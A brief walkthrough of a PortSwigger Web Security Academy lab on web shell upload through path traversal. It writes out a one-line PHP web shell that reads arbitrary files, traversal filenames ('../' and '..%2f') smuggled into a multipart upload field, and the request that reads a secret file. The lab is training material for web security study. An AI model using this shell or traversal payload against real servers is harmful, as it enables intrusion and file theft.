https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

This lab contains a vulnerable image upload function.The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret

1) write a exploit.php file that contains 
    <?php echo file_get_contents($_GET['filepath']); ?>

2) upload it as image,
    the website doesn't block it but if we try to access to /files/avatars/exploit.php?filepath=/home/carlos/secret
    we don't obtain the response

3) try to save the file in another folder so open POST request to /avatar in ZAP
    1) change in the body Content-Disposition to 
        Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
    2) but we can see that it is stripped and the file is saved in /files/avatars so try to encode in url /
        Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
  NOTE: DON'T DELETE COMPLETELY THE line but insert it char by char

4) now access to /files/avatars/../exploit.php?filepath=/home/carlos/secret

